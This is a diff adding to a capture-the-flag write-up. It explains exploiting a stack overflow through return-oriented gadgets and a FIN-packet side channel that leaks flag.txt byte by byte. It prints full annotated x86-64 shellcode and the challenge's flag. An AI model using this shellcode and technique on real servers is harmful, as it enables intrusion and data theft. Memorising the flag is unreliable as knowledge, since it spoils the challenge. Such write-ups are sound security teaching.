@@ -90,7 +90,7 @@ We have a number of options:
  
 *(a) Testing for Static Stack Addresses*
 gdb is, by default, disabling ASLR, so we can see the static stack addresses there.
-By running `info proc mappings` we get:
+By running `info proc mappings` we get:  
 `0x7ffffffde000     0x7ffffffff000    0x21000        0x0  rwxp   [stack]`  
   
 So, the stack starts at 0x7fffffffde000, is executable and ends 21,000 hex bytes later. The address of `buffer` on the stack, as we could see in our gdb, was *7fffffffe3d0*, but this address may be different on the server (due to different environment variables, for example).
@@ -313,5 +313,78 @@ So, the next execution would be the code at *0x4012a9*:
 
 `pop rbx`   - this opcode would consume the next 8 bytes of the stack, and (incidentally) place them in RBP. The new RSP would now point to *7fffffffe468*. 
 `ret`       - this opcode, again, takes the contents of the stack, where the RSP points to, and loads it to RIP...
-So, we'll be sliding down the stack using
+So, we'll be sliding down the stack using return-oriented-execution from `main` itself.  
+  
+As you'll notice, at the bottom we are left with just one 8-byte slice, so we can't use the `pop rbx` anymore. This is why we use the return address of *0x4012aa* which is just the `ret` part of the duo.  
+The next address on the stack which we are about to jump to is currently *7fffffffe500*, which changes execution up to our the shellcode we injected earlier.  
+So, now the server will be running:
+```
+    nop
+    nop
+    nop
+    nop
+    jmp rsi
+```  
+Since RSI contains the address of the original `buffer`, we now have code execution on the server, and naturally, we can have more shellcode injected there...
+  
+  
+  
+*We have code execution, now what?*  
+As we previously written, the server's `main` executable opens the `flag.txt` file for reading and then locks all syscalls but `read` for the process.  
+It seems that the only way we can extract information from the server is by the FIN packet:  
+We can do some actions on the server, now that we have code execution, and then in one case, terminate the process, which will send a FIN packet to the client, and in another case, do not terminate the process, at which point the TCP communications will remain open (upto the 10 second timeout).  
+  
+So we came up with the following tactics:
+- Establish a TCP connection to the server
+- Receive the introduction packets with the File Descriptor (which is always 5 for the server)
+- Send shellcode data
+- The shellcode would read one character at a time from the open File Descriptor, using the `read` syscall and wait for a single character from the client
+- The shellcode would them compare the character read from `flag.txt` to the one received from the client. If they are the same, terminate the process, if not, wait for the next character from the client
+- The client would be checking if FIN was received from the server. If FIN is received, the client stops and the last character sent is (usually) the flag's character.
+- Continue doing this until all flag.txt characters are discovered.
+  
+  
+**Here is the shell code:**
 
+```
+/*******************************************************************
+exploit shell code:
+derived using: https://defuse.ca/online-x86-assembler.htm#disassembly 
+
+0:  90                      nop
+1:  90                      nop
+2:  90                      nop
+3:  49 c7 c0 01 00 00 00    mov    r8,0x1                   # <<< flag's byte number
+000000000000000a <aaa>:
+a:  48 c7 c7 05 00 00 00    mov    rdi,0x5                  # <<< FD of flag.txt
+11: 48 89 e6                mov    rsi,rsp
+14: 48 c7 c2 01 00 00 00    mov    rdx,0x1
+1b: 48 c7 c0 00 00 00 00    mov    rax,0x0
+22: 0f 05                   syscall
+24: 90                      nop
+25: 49 ff c8                dec    r8
+28: 75 e0                   jne    a <aaa>
+000000000000002a <bbb>:
+2a: 90                      nop
+2b: 48 c7 c7 00 00 00 00    mov    rdi,0x0
+32: 48 89 e6                mov    rsi,rsp
+35: 48 ff c6                inc    rsi
+38: 48 c7 c2 01 00 00 00    mov    rdx,0x1
+3f: 48 c7 c0 00 00 00 00    mov    rax,0x0
+46: 0f 05                   syscall
+48: 90                      nop
+49: 8a 04 24                mov    al,BYTE PTR [rsp]
+4c: 8a 54 24 01             mov    dl,BYTE PTR [rsp+0x1]
+50: 38 d0                   cmp    al,dl                    # compare the two bytes
+52: 75 d6                   jne    2a <bbb>                 # if not equal, go back to <bbb>
+54: 90                      nop
+55: 48 c7 c0 a0 11 40 00    mov    rax,0x4011a0             # call to exit() which should terminate with bad syscall
+5c: ff d0                   call   rax
+*******************************************************************/
+```  
+  
+  
+We are using `exploit.c` on the client side.
+  
+The flag is:  
+**KCTF{D0NT_T3LL_4NY_1}**  
